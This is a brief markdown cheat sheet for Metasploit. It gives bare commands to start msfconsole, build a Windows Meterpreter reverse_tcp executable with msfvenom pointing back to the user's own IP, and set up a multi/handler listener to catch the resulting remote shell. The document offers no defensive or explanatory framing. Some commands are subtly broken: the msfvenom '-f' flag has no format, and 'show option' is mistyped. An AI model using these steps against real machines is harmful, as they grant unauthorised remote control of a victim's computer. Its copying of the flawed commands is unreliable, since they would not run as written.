# Metasploit

```text
sudo msfdb init && msfconsole

show exploits
searchsploit
```

```text
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[your IP] -f -o outputfile.exe
```

```text
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
show option
set LHOST [your IP]
exploit -j -z
```



